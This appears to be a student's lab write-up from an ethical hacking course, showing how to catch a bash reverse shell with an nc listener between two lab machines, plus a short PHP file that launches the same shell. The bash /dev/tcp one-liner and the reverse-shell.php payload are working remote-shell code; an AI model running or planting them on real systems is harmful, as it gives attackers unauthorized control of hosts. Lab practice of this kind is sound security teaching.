# Reverse Shells

1. Login to sec335-rocky(10.0.17.200) from kali using ssh and your cyber.local credentials.
```
ssh charlotte.croce@cyber.local@10.0.17.200
```
2. Determine your IP address for your kali vm's eth0
```
ip addr
...
10.0.17.26
...
```
3. On Kali, Create a nc listener on 4449/tcp
```
nc -nlvp 4449
```
5. On Rocky Use a native bash reverse shell to connect back to your listener
```
/bin/bash -i >& /dev/tcp/10.0.17.26/4449 0>&1
```
7. Interact with sec335-rocky over your kali nc session.
```
┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/week09/sqli-labs-php7]
└─$ nc -nlvp 4449
listening on [any] 4449 ...
connect to [10.0.17.26] from (UNKNOWN) [10.0.17.200] 56900
[charlotte.croce@cyber.local@sec335-rocky ~]$ whoami
whoami
charlotte.croce@cyber.local
```

### reverse-shell.php
```
<?php
shell_exec('/bin/bash -i >& /dev/tcp/10.0.17.26/4449 0>&1');
?>
```
